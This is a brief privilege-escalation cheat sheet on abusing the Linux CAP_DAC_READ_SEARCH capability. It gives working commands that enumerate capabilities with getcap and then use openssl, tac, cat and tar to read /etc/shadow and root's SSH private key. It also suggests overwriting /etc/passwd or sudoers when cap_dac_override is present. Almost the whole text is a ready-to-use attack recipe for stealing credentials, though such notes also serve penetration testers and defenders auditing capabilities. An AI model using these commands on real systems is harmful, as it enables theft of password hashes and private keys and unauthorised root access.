# cap_dac_read_search Arbitrary File Read

`CAP_DAC_READ_SEARCH` bypasses all DAC read permission checks — a binary with this capability can read any file.

Enumerate:
```bash
getcap -r / 2>/dev/null
# look for cap_dac_read_search or cap_dac_override
```

**openssl** with `cap_dac_read_search`:
```bash
openssl enc -in /etc/shadow
openssl enc -in /root/.ssh/id_rsa
```

**tac** or **cat** with the capability:
```bash
tac /root/.ssh/id_rsa   # outputs file in reverse — read in reverse to get original
/path/to/custom_cat /etc/shadow
```

**tar** with `cap_dac_read_search`:
```bash
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp/
```

If the binary also has `cap_dac_override`, it can write arbitrary files → overwrite `/etc/passwd` or sudoers.
